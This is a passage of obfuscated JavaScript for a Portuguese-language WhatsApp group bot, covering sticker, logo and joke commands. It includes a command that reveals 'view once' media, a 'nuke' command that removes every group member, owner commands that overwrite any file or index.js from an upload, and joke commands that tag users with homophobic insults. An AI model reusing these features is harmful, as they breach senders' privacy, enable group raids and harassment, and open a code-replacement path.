              fs.writeFileSync("./DADOS/datab/data/CVF.json", JSON.stringify([_0x54198a ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : _0xd2050d.message.imageMessage || _0xee3727 ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : _0xd2050d.message.videoMessage]));
              var _0x291321 = JSON.parse(fs.readFileSync("./DADOS/datab/data/CVF.json"));
              var _0x2a4519 = _0x291321[0];
              _0x2a4519.sticker = {
                'url': _0x2a4519.url
              };
              await delay(1200);
              DLT_FL("./DADOS/datab/data/CVF.json");
              _0x5196be.sendMessage(_0x346d97, _0x2a4519);
              break;
            case 'st':
            case "stk":
            case "sticker":
            case 's':
              var _0x265ba4 = _0xd2050d.message?.["extendedTextMessage"]?.["contextInfo"]?.["quotedMessage"];
              var _0x4f8e1c = _0x265ba4?.["imageMessage"] || _0xd2050d.message?.["imageMessage"] || _0x265ba4?.["viewOnceMessageV2"]?.["message"]?.["imageMessage"] || _0xd2050d.message?.["viewOnceMessageV2"]?.["message"]?.["imageMessage"] || _0xd2050d.message?.["viewOnceMessage"]?.["message"]?.["imageMessage"] || _0x265ba4?.["viewOnceMessage"]?.["message"]?.["imageMessage"];
              var _0x48d7b9 = _0x265ba4?.["videoMessage"] || _0xd2050d.message?.["videoMessage"] || _0x265ba4?.["viewOnceMessageV2"]?.["message"]?.["videoMessage"] || _0xd2050d.message?.["viewOnceMessageV2"]?.["message"]?.["videoMessage"] || _0xd2050d.message?.["viewOnceMessage"]?.["message"]?.["videoMessage"] || _0x265ba4?.["viewOnceMessage"]?.["message"]?.["videoMessage"];
              if (_0x4f8e1c) {
                _0x50740b(_0x50f430);
                owgi = await getFileBuffer(_0x4f8e1c, "image");
                const _0x2ada8c = {
                  packname: _0x4ecbb6,
                  author: _0x56ed9d
                };
                let _0x2c4c52 = await sendImageAsSticker2(_0x5196be, _0x346d97, owgi, _0xd2050d, _0x2ada8c);
                await DLT_FL(_0x2c4c52);
              } else {
                if (_0x48d7b9 && _0x48d7b9.seconds < 11) {
                  _0x50740b(_0x50f430);
                  owgi = await getFileBuffer(_0x48d7b9, "video");
                  const _0x2fe207 = {
                    packname: _0x4ecbb6,
                    author: _0x56ed9d
                  };
                  let _0x4c6b99 = await sendVideoAsSticker2(_0x5196be, _0x346d97, owgi, _0xd2050d, _0x2fe207);
                  await DLT_FL(_0x4c6b99);
                } else {
                  return _0x50740b("Marque uma imagem, ou um vídeo de ate 9.9 segundos, ou uma visualização única, para fazer figurinha, com o comando " + (_0x141936 + _0x267d4b));
                }
              }
              break;
            case "rvvisu":
            case "revelarvisu":
            case "rvvisuunica":
              _0x265ba4 = _0xd2050d.message?.["extendedTextMessage"]?.["contextInfo"]?.["quotedMessage"]["viewOnceMessageV2"]?.["message"];
              let _0x10a57b = _0x265ba4?.["imageMessage"] || _0x265ba4?.["videoMessage"];
              if (!_0x10a57b) {
                return _0x50740b("Marque uma visualização única, para eu revelar ela");
              }
              _0x50740b("Aguarde..");
              rst = await getFileBuffer(_0x10a57b, _0x10a57b.mimetype.split('/')[0]);
              abd = _0x10a57b?.["caption"] + "\n\nRevelando a visualização unica.." || "Revelando a visualização unica..";
              _0x5196be.sendMessage(_0x346d97, {
                [_0x10a57b.mimetype.split('/')[0]]: rst,
                'caption': abd
              });
              break;
            case "placaloli":
              if (!_0x11e99e.trim()) {
                return _0x50740b(enviar.wrongFormat);
              }
              _0x50740b("Aguarde..");
              lod = await fetchJson("https://nekobot.xyz/api/imagegen?type=kannagen&text=" + _0x11e99e);
              _0x125a55(_0x346d97, lod.message, enviar.success);
              break;
            case "logos1":
              if (!_0x11e99e.trim()) {
                return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " Aleatory");
              }
              var _0x75423d = ["shadow", "metalgold", "cup", "txtborboleta", "cemiterio", "efeitoneon", "harryp", "lobometal", "neon2", "madeira", "lovemsg3", "coffecup", "coffecup2", "florwooden", "narutologo", "fire", "romantic", "smoke", "papel", "lovemsg", "lovemsg2", "fiction", "3dstone", "areia", "style", "blood", "pink", "cattxt", "neondevil", "carbon", "metalfire", "thunder", "vidro", "jokerlogo", "transformer", "demonfire", "jeans", "metalblue", "natal", "ossos", "asfalto", "break", "glitch2", "colaq", "neon3", "nuvem", "horror", "matrix", "berry", "luxury", "lava", "thunderv2", "neongreen", "neve", "neon", "neon1", "neon3d", "gelo", "neon3", "3dgold", "lapis", "toxic", "demongreen", "rainbow", "halloween", "angelwing", "hackneon", "fpsmascote", "equipemascote", "txtquadrinhos", "ffavatar", "mascotegame", "angelglx", "gizquadro", "wingeffect", "blackpink", "metalgold", "girlmascote", "logogame"];
              var _0x42e5d5 = [];
              for (var _0x3d4245 = 0; _0x3d4245 < _0x75423d.length; _0x3d4245++) {
                _0x42e5d5.push({
                  'title': _0x75423d[_0x3d4245],
                  'description': "Logo personalizadas: " + (_0x3d4245 + 1),
                  'rowId': _0x141936 + _0x75423d[_0x3d4245] + (" " + _0x11e99e)
                });
              }
              _0x274bc5(_0x346d97, "Texto: " + _0x11e99e, "Diversas logos", "Escolha a qual desejar", "Clique aqui..", "Logos top..", _0x42e5d5);
              break;
            case "angelwing":
            case "hackneon":
            case "fpsmascote":
            case "equipemascote":
            case "txtquadrinhos":
            case "ffavatar":
            case "mascotegame":
            case "angelglx":
            case "gizquadro":
            case "wingeffect":
            case "blackpink":
            case "metalgold":
            case "girlmascote":
            case "logogame":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Digite algo, Exemplo: " + (_0x141936 + _0x267d4b) + " bronxys");
                }
                _0x50740b(_0x50f430);
                let _0x412fe1 = await reqapi.logos_eph(_0x11e99e.trim(), _0x267d4b);
                const _0x490693 = {
                  url: _0x412fe1.resultado
                };
                const _0x4b0c4c = {
                  image: _0x490693
                };
                const _0xac41a1 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x4b0c4c, _0xac41a1)["catch"](() => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x51fde9) {
                return _0x50740b("Erro...");
              }
              break;
            case "fiction":
            case "3dstone":
            case "areia":
            case "style":
            case "blood":
            case "pink":
            case "cattxt":
            case "neondevil":
            case "carbon":
            case "metalfire":
            case "thunder":
            case "vidro":
            case "jokerlogo":
            case "transformer":
            case "demonfire":
            case "jeans":
            case "metalblue":
            case "natal":
            case "ossos":
            case "asfalto":
            case "break":
            case "glitch2":
            case "colaq":
            case "neon3":
            case "nuvem":
            case "horror":
            case "matrix":
            case "berry":
            case "luxury":
            case "lava":
            case "thunderv2":
            case "neongreen":
            case "neve":
            case "neon":
            case "neon1":
            case "neon3d":
            case "gelo":
            case "neon3":
            case "3dgold":
            case "lapis":
            case "toxic":
            case "demongreen":
            case "rainbow":
            case "halloween":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Digite algo, Exemplo: " + (_0x141936 + _0x267d4b) + " bronxys");
                }
                _0x50740b(_0x50f430);
                let _0x23d702 = await reqapi.logos(_0x11e99e.trim(), _0x267d4b);
                _0x26ddac(_0x23d702.resultado);
              } catch (_0x118624) {
                return _0x50740b("Erro...");
              }
              break;
            case "shadow":
            case "metalgold":
            case "cup":
            case "txtborboleta":
            case "cemiterio":
            case "efeitoneon":
            case "harryp":
            case "lobometal":
            case "neon2":
            case "madeira":
            case "lovemsg3":
            case "coffecup":
            case "coffecup2":
            case "florwooden":
            case "narutologo":
            case "fire":
            case "romantic":
            case "smoke":
            case "papel":
            case "lovemsg":
            case "lovemsg2":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Digite algo, Exemplo: " + (_0x141936 + _0x267d4b) + " bronxys");
                }
                _0x50740b(_0x50f430);
                let _0x3bad49 = await reqapi.logos_pht(_0x11e99e.trim(), _0x267d4b);
                const _0x13e160 = {
                  url: _0x3bad49.resultado.imageUrl
                };
                const _0x27079c = {
                  image: _0x13e160
                };
                const _0x48cab0 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x27079c, _0x48cab0)["catch"](_0x343ace => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x528263) {
                return _0x50740b("Erro...");
              }
              break;
            case "metadinha":
              try {
                let _0x5394c8 = await reqapi.metadinha();
                const _0x5c3237 = {
                  url: _0x5394c8.link1
                };
                const _0x5627cd = {
                  image: _0x5c3237
                };
                _0x5196be.sendMessage(_0x346d97, _0x5627cd)["catch"](() => {
                  return _0x50740b("Erro..");
                });
                const _0x123ff6 = {
                  url: _0x5394c8.link2
                };
                const _0x4cb6b6 = {
                  image: _0x123ff6
                };
                _0x5196be.sendMessage(_0x346d97, _0x4cb6b6)["catch"](() => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x497646) {
                return _0x50740b("Erro..");
              }
              break;
            case "substituir":
            case "adicionar":
              if (!_0xf59944 && !_0x3eefd0) {
                return _0x50740b("Só dono..");
              }
              if (!_0x11e99e) {
                return _0x50740b("*Informe o diretório da pasta e o nome do arquivo, exemplo: " + _0x141936 + _0x267d4b + " ./DADOS/NomeDoArquivo.txt*");
              }
              if (_0x39e519 && !_0xd2050d.message.videoMessage || _0x47f03c) {
                media = _0x47f03c ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : _0xd2050d.message.documentMessage;
                rane = getRandom('.' + (await getExtension(media.mimetype)));
                doc = await getFileBuffer(media, "document");
                try {
                  if (_0x267d4b === "substituir") {
                    if (fs.existsSync(_0x11e99e)) {
                      const _0x378d22 = {
                        flag: 'w'
                      };
                      fs.writeFileSync(_0x11e99e, doc, _0x378d22);
                      const _0x5175e0 = {
                        text: "Arquivo substituído com sucesso.."
                      };
                      const _0x5183c2 = {
                        quoted: _0xd2050d
                      };
                      _0x5196be.sendMessage(_0x346d97, _0x5175e0, _0x5183c2);
                    } else {
                      _0x50740b("Erro ao substituir o arquivo. O arquivo não existe.");
                    }
                  } else {
                    if (_0x267d4b === "adicionar") {
                      if (fs.existsSync(_0x11e99e)) {
                        _0x50740b("Erro ao adicionar o arquivo. O arquivo já existe.");
                      } else {
                        const _0x3fea69 = {
                          flag: 'wx'
                        };
                        fs.writeFileSync(_0x11e99e, doc, _0x3fea69);
                        const _0x5630a7 = {
                          text: "Arquivo adicionado com sucesso.."
                        };
                        const _0x44b9cb = {
                          quoted: _0xd2050d
                        };
                        _0x5196be.sendMessage(_0x346d97, _0x5630a7, _0x44b9cb);
                      }
                    }
                  }
                } catch (_0x3fadf7) {
                  _0x50740b("Erro ao manipular o arquivo.");
                }
                setTimeout(() => {
                  process.exit();
                }, 1000);
              } else {
                _0x50740b("Marque o documento ou arquivo..");
              }
              break;
            case "index-bot":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (_0x39e519 && !_0xd2050d.message.videoMessage || _0x47f03c) {
                media = _0x47f03c ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : _0xd2050d.message.documentMessage;
                rane = getRandom('.' + (await getExtension(media.mimetype)));
                doc = await getFileBuffer(media, "document");
                fs.writeFileSync("./index.js", doc);
                const _0x3706d7 = {
                  text: "Atualizado Com Sucesso.."
                };
                const _0x1d478b = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x3706d7, _0x1d478b);
                setTimeout(() => {
                  process.exit();
                }, 1000);
              } else {
                _0x50740b("Marque o documento ou o arquivo que deseja enviar pra determinar pasta ou substituir..");
              }
              break;
            case "bann":
              if (!_0xf59944) {
                return _0x50740b("Só usuário premium pode utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("Marque a mensagem do usuário ou marque o @ dele.., lembre de só marcar um usuário...");
              }
              if (!JSON.stringify(groupMembers).includes(_0x5e13bf)) {
                return _0x50740b("Este usuário já foi removido ou saiu do grupo.");
              }
              if (premium.includes(_0x5e13bf)) {
                return _0x1106fd('@' + _0x5e13bf.split('@')[0] + " a(o) @" + _0x45b1c6 + " está querendo banir você, visualiza esse problema ae 😶", [_0x5e13bf], true);
              }
              if (_0x1c25a7.includes(_0x5e13bf)) {
                return _0x1106fd('@' + _0x5e13bf.split('@')[0] + " a(o) @" + _0x45b1c6 + " está querendo banir você, visualiza esse problema ae 😶", [_0x5e13bf], true);
              }
              if (_0x517366.includes(_0x5e13bf)) {
                return _0x50740b("Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você");
              }
              if (_0x5bd5f4.includes(_0x5e13bf)) {
                return _0x50740b("Não posso remover meu dono 🤧");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'text': '@' + _0x5e13bf.split('@')[0] + " Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos ainda não esclarecidos) -",
                'mentions': [_0x5e13bf]
              });
              _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x5e13bf], "remove");
              break;
            case "nuke":
            case "arquivargp":
              if (!_0xf59944 && !_0x3eefd0) {
                return _0x50740b("Só dono pode utilizar este comando...");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0xd2050d.key.fromMe) {
                return;
              }
              blup = [];
              for (_0x3194f3 of groupMembers) {
                if (!_0x5bd5f4.includes(_0x3194f3.id)) {
                  blup.push(_0x3194f3.id);
                }
              }
              blup.splice(blup.indexOf(_0x517366), 1);
              for (_0x3194f3 = 0; _0x3194f3 < blup.length; _0x3194f3++) {
                await sleep(500);
                _0x5196be.groupParticipantsUpdate(_0x346d97, [blup[_0x3194f3]], "remove");
              }
              break;
            case "attp":
            case "attp2":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " ESDEATH");
                }
                _0x50740b(_0x50f430);
                const _0x75b8bb = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'sticker': {
                    'url': reqapi.attp(_0x11e99e.trim(), _0x267d4b)
                  }
                }, _0x75b8bb)["catch"](_0x595a94 => {
                  return _0x50740b("Erro..");
                });
              } catch (_0xf2ef20) {
                return _0x50740b("Erro..");
              }
              break;
            case "gerarnick":
            case "fazernick":
              try {
                let _0x2b0860;
                if (ANT_LTR_MD_EMJ(_0x11e99e)) {
                  return _0x50740b("Não pode letras modificadas nem emoji..");
                }
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Escreveva um nome para eu enviar ele com letras modificadas, Exemplo: " + (_0x141936 + _0x267d4b) + " bronxys");
                }
                let _0x5b1c7e = await reqapi.gerarnick(_0x11e99e.trim());
                _0x2b0860 = "Lista com base no Nick informado, para encontrar melhor fonte para utilizar:\n\n";
                for (_0x3194f3 of _0x5b1c7e) {
                  _0x2b0860 += _0x3194f3 + "\n\n";
                }
                _0x50740b(_0x2b0860);
              } catch (_0xffd042) {
                return _0x50740b("Erro.. " + _0xffd042);
              }
              break;
            case "chance":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              var _0x193d1e = _0x3ac611.slice(7);
              const _0x3012c5 = {
                text: "Você precisa digitar da forma correta\nExemplo: " + _0x141936 + "chance do luuck ser gay"
              };
              const _0x7a3c18 = {
                quoted: _0xd2050d
              };
              if (_0x23d865.length < 1) {
                return _0x5196be.sendMessage(_0x346d97, _0x3012c5, _0x7a3c18);
              }
              random = '' + Math.floor(Math.random() * 100);
              hasil = "A chance " + _0x3ac611.slice(8) + "\n\né de... " + random + '%';
              _0x5dcc57(hasil);
              break;
            case "nazista":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'text': "❰ Pesquisando a sua ficha de nazista : @" + _0x1911ab.split('@')[0] + " aguarde... ❱",
                'mentions': [_0x1911ab]
              });
              setTimeout(async () => {
                random = '' + Math.floor(Math.random() * 110);
                const _0x309015 = {
                  url: imgnazista
                };
                const _0x4491f8 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x309015,
                  'caption': "O quanto você é nazista? \n\n「 @" + _0x1911ab.split('@')[0] + " 」Você é: ❰ " + random + "% ❱  nazista 卐",
                  'mentions': [_0x1911ab]
                }, _0x4491f8);
              }, 7000);
              break;
            case "gay":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'text': "❰ Pesquisando a sua ficha de gay : @" + _0x1911ab.split('@')[0] + " aguarde... ❱",
                'mentions': [_0x1911ab]
              });
              setTimeout(async () => {
                random = '' + Math.floor(Math.random() * 110);
                feio = random;
                boiola = random;
                if (boiola < 20) {
                  var _0x4090ae = "hmm... você é hetero😔";
                } else {
                  if (boiola == 21) {
                    var _0x4090ae = "+/- boiola";
                  } else {
                    if (boiola == 23) {
                      var _0x4090ae = "+/- boiola";
                    } else {
                      if (boiola == 24) {
                        var _0x4090ae = "+/- boiola";
                      } else {
                        if (boiola == 25) {
                          var _0x4090ae = "+/- boiola";
                        } else {
                          if (boiola == 26) {
                            var _0x4090ae = "+/- boiola";
                          } else {
                            if (boiola == 27) {
                              var _0x4090ae = "+/- boiola";
                            } else {
                              if (boiola == 2) {
                                var _0x4090ae = "+/- boiola";
                              } else {
                                if (boiola == 29) {
                                  var _0x4090ae = "+/- boiola";
                                } else {
                                  if (boiola == 30) {
                                    var _0x4090ae = "+/- boiola";
                                  } else {
                                    if (boiola == 31) {
                                      var _0x4090ae = "tenho minha desconfiança...😑";
                                    } else {
                                      if (boiola == 32) {
                                        var _0x4090ae = "tenho minha desconfiança...😑";
                                      } else {
                                        if (boiola == 33) {
                                          var _0x4090ae = "tenho minha desconfiança...😑";
                                        } else {
                                          if (boiola == 34) {
                                            var _0x4090ae = "tenho minha desconfiança...😑";
                                          } else {
                                            if (boiola == 35) {
                                              var _0x4090ae = "tenho minha desconfiança...😑";
                                            } else {
                                              if (boiola == 36) {
                                                var _0x4090ae = "tenho minha desconfiança...😑";
                                              } else {
                                                if (boiola == 37) {
                                                  var _0x4090ae = "tenho minha desconfiança...😑";
                                                } else {
                                                  if (boiola == 3) {
                                                    var _0x4090ae = "tenho minha desconfiança...😑";
                                                  } else {
                                                    if (boiola == 39) {
                                                      var _0x4090ae = "tenho minha desconfiança...😑";
                                                    } else {
                                                      if (boiola == 40) {
                                                        var _0x4090ae = "tenho minha desconfiança...😑";
                                                      } else {
                                                        if (boiola == 41) {
                                                          var _0x4090ae = "você é né?😏";
                                                        } else {
                                                          if (boiola == 42) {
                                                            var _0x4090ae = "você é né?😏";
                                                          } else {
                                                            if (boiola == 43) {
                                                              var _0x4090ae = "você é né?😏";
                                                            } else {
                                                              if (boiola == 44) {
                                                                var _0x4090ae = "você é né?😏";
                                                              } else {
                                                                if (boiola == 45) {
                                                                  var _0x4090ae = "você é né?😏";
                                                                } else {
                                                                  if (boiola == 46) {
                                                                    var _0x4090ae = "você é né?😏";
                                                                  } else {
                                                                    if (boiola == 47) {
                                                                      var _0x4090ae = "você é né?😏";
                                                                    } else {
                                                                      if (boiola == 4) {
                                                                        var _0x4090ae = "você é né?😏";
                                                                      } else {
                                                                        if (boiola == 49) {
                                                                          var _0x4090ae = "você é né?😏";
                                                                        } else {
                                                                          if (boiola == 50) {
                                                                            var _0x4090ae = "você é ou não?🧐";
                                                                          } else {
                                                                            if (boiola > 51) {
                                                                              var _0x4090ae = "você é gay🙈";
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
                const _0x460b1e = {
                  url: imggay
                };
                const _0x367229 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x460b1e,
                  'caption': "  O quanto você é gay? \n\n 「 @" + _0x1911ab.split('@')[0] + " 」Você é: ❰ " + random + "% ❱ gay 🏳️‍🌈\n\n" + _0x4090ae,
                  'mentions': [_0x1911ab],
                  'thumbnail': null
                }, _0x367229);
              }, 7000);
              break;
            case "feio":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'text': "❰ Pesquisando a sua ficha de feio : @" + _0x1911ab.split('@')[0] + " aguarde... ❱",
                'mentions': [_0x1911ab]
              });
              setTimeout(async () => {
                random = '' + Math.floor(Math.random() * 110);
                feio = random;
                if (feio < 20) {
                  var _0x484020 = "É não é feio";
                } else {
                  if (feio == 21) {
                    var _0x484020 = "+/- feio";
                  } else {
                    if (feio == 23) {
                      var _0x484020 = "+/- feio";
                    } else {
                      if (feio == 24) {
                        var _0x484020 = "+/- feio";
                      } else {
                        if (feio == 25) {
                          var _0x484020 = "+/- feio";
                        } else {
                          if (feio == 26) {
                            var _0x484020 = "+/- feio";
                          } else {
                            if (feio == 27) {
                              var _0x484020 = "+/- feio";
                            } else {
                              if (feio == 2) {
                                var _0x484020 = "+/- feio";
                              } else {
                                if (feio == 29) {
                                  var _0x484020 = "+/- feio";
                                } else {
                                  if (feio == 30) {
                                    var _0x484020 = "+/- feio";
                                  } else {
                                    if (feio == 31) {
                                      var _0x484020 = "Ainda tá na média";
                                    } else {
                                      if (feio == 32) {
                                        var _0x484020 = "Da pra pegar umas(ns) novinha(o) ainda";
                                      } else {
                                        if (feio == 33) {
                                          var _0x484020 = "Da pra pegar umas(ns) novinha(o) ainda";
                                        } else {
                                          if (feio == 34) {
                                            var _0x484020 = "É fein, mas tem baum coração";
                                          } else {
                                            if (feio == 35) {
                                              var _0x484020 = "Tá na média, mas não deixa de ser feii";
                                            } else {
                                              if (feio == 36) {
                                                var _0x484020 = "Bonitin mas é feio com orgulho";
                                              } else {
                                                if (feio == 37) {
                                                  var _0x484020 = "Feio e preguiçoso(a), vai se arrumar praga feia";
                                                } else {
                                                  if (feio == 3) {
                                                    var _0x484020 = "tenho ";
                                                  } else {
                                                    if (feio == 39) {
                                                      var _0x484020 = "Feio, mas um banho E se arrumar, deve resolver";
                                                    } else {
                                                      if (feio == 40) {
                                                        var _0x484020 = "FeiN,  mas não existe gente feia, existe gente que não conhece os produtos jequity";
                                                      } else {
                                                        if (feio == 41) {
                                                          var _0x484020 = "você é Feio, mas é legal, continue assim";
                                                        } else {
                                                          if (feio == 42) {
                                                            var _0x484020 = "Nada que uma maquiagem e se arrumar, que não resolva 🥴";
                                                          } else {
                                                            if (feio == 43) {
                                                              var _0x484020 = "Feio que dói de ver, compra uma máscara que melhora";
                                                            } else {
                                                              if (feio == 44) {
                                                                var _0x484020 = "Feio mas nada que um saco na cabeça não resolva né!?";
                                                              } else {
                                                                if (feio == 45) {
                                                                  var _0x484020 = "você é feio, mas tem bom gosto";
                                                                } else {
                                                                  if (feio == 46) {
                                                                    var _0x484020 = "Feio mas tem muitos amigos";
                                                                  } else {
                                                                    if (feio == 47) {
                                                                      var _0x484020 = "Feio mas tem lábia pra pegar várias novinha";
                                                                    } else {
                                                                      if (feio == 4) {
                                                                        var _0x484020 = "Feio e ainda não sabe se vestir, vixi";
                                                                      } else {
                                                                        if (feio == 49) {
                                                                          var _0x484020 = "Feiooo";
                                                                        } else {
                                                                          if (feio == 50) {
                                                                            var _0x484020 = "você é Feio, mas não se encherga 🧐";
                                                                          } else {
                                                                            if (feio > 51) {
                                                                              var _0x484020 = "você é Feio demais 🙈";
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
                const _0x2afb71 = {
                  url: imgfeio
                };
                const _0x370a31 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x2afb71,
                  'caption': "  O quanto você é feio? \n\n 「 @" + _0x1911ab.split('@')[0] + " 」Você é: ❰ " + random + "% ❱ feio 🙉\n\n" + _0x484020,
                  'mentions': [_0x1911ab],
                  'thumbnail': null
                }, _0x370a31);
              }, 7000);
              break;
            case "corno":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'text': " ❰ Pesquisando a ficha de corno : @" + _0x1911ab.split('@')[0] + ", aguarde... ❱",
                'mentions': [_0x1911ab]
              });
              setTimeout(async () => {
                random = '' + Math.floor(Math.random() * 110);
                const _0x1f537d = {
                  url: imgcorno
                };
                const _0x285b57 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x1f537d,
                  'caption': " O quanto você é corno? \n\n 「 @" + _0x1911ab.split('@')[0] + " 」Você é: ❰ " + random + "% ❱  corno 🐃",
                  'mentions': [_0x1911ab]
                }, _0x285b57);
              }, 7000);
              break;
            case "vesgo":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'text': "❰ Pesquisando a ficha de vesgo : @" + _0x1911ab.split('@')[0] + ", aguarde... ❱",
                'mentions': [_0x1911ab]
              });
              setTimeout(async () => {
                random = '' + Math.floor(Math.random() * 110);
                const _0x3f8371 = {
                  url: imgvesgo
                };
                const _0x32b408 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x3f8371,
                  'caption': "O quanto você é vesgo? \n\n「 @" + _0x1911ab.split('@')[0] + " 」Você é: ❰ " + random + "% ❱  Vesgo 🙄😆",
                  'mentions': [_0x1911ab]
                }, _0x32b408);
              }, 7000);
              break;
            case "bebado":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'text': "❰ Pesquisando a ficha de bebado : @" + _0x1911ab.split('@')[0] + " , aguarde... ❱",
                'mentions': [_0x1911ab]
              });
              setTimeout(async () => {
                random = '' + Math.floor(Math.random() * 110);
                const _0x2cba93 = {
                  url: imgbebado
                };
                const _0xa066 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x2cba93,
                  'caption': "O quanto você é bebado? \n\n「 @" + _0x1911ab.split('@')[0] + " 」Você é: ❰ " + random + "% ❱ Bêbado 🤢🥵🥴",
                  'mentions': [_0x1911ab]
                }, _0xa066);
              }, 7000);
              break;
            case "gado":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'text': "❰ Pesquisando a ficha de gado : @" + _0x1911ab.split('@')[0] + ", aguarde... ❱",
                'mentions': [_0x1911ab]
              });
              setTimeout(async () => {
                random = '' + Math.floor(Math.random() * 110);
                const _0xcf9bae = {
                  url: gadocmd
                };
                const _0x35bf33 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'video': _0xcf9bae,
                  'gifPlayback': true,
                  'caption': "O quanto você é gado? \n\n「 @" + _0x1911ab.split('@')[0] + " 」Você é: ❰ " + random + "% ❱  gado 🐂",
                  'mentions': [_0x5e13bf]
                }, _0x35bf33);
              }, 7000);
              break;
            case "gostoso":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'text': " ❰ Pesquisando a sua ficha de gostoso : @" + _0x1911ab.split('@')[0] + " aguarde... ❱",
                'mentions': [_0x1911ab]
              });
              setTimeout(async () => {
                random = '' + Math.floor(Math.random() * 110);
                const _0x4783ee = {
                  url: imggostoso
                };
